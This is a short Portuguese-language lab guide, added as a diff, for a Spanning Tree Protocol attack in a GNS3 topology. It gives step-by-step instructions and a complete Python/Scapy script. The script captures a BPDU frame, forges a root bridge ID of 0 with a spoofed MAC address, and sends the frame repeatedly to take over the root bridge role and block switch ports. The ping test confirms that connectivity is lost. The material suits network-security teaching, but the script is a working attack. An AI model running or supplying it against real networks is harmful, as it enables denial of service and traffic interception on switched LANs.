@@ -1,0 +1,41 @@
+STP Attack
+
+Passos:
+1. Abrir o GNS3 e montar a topologia da Figura 1;
+2. Abrir o Switch 2 e colocar o seguinte comando “sh spanning-tree” para
+vermos o Protocolo Spanning-Tree e a interface Gi0/1 como Root Port;
+3. Repetir o passo anterior no Switch 1 desta vez para vermos a eleição do
+Switch 1 como Root Bridge;
+4. Abrir o terminal no Kali Linux, e correr o comando “sudo python3
+stp1.py” para lançarmos o ataque;
+5. Abrir o Switch 2 e colocar o seguinte comando “sh spanning-tree” para
+vermos o Protocolo Spanning-Tree e a interface Gi0/1 no estado blocked;
+6. Abrir o PC2 e realizar um ping da seguinte forma “ping 192.168.1.1”,
+percebendo que não o conseguimos fazer, o que significa que fomos bem
+sucedidos.
+
+
+Script:
+#!/usr/bin/env python3
+#Import scapy
+from scapy.all import *
+#Capture STP frame
+pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)    
+#Change the MAC address in the frame to the following:
+pkt[0].src="00:00:00:00:00:01"
+#Set Rootid
+pkt[0].rootid=0
+#Set rootmac
+pkt[0].rootmac="00:00:00:00:00:01"
+#Set Bridgeid
+pkt[0].bridgeid=0  
+#Set rootmac
+pkt[0].bridgemac="00:00:00:00:00:01"
+#Show changed frame
+pkt[0].show()
+#Loop to send multiple frames into the network:
+for i in range (0, 50):
+    #Send changed frame back into the network:
+    sendp(pkt[0], loop=0, verbose=1)
+    #Sleep / wait for one second:
+    time.sleep(1)
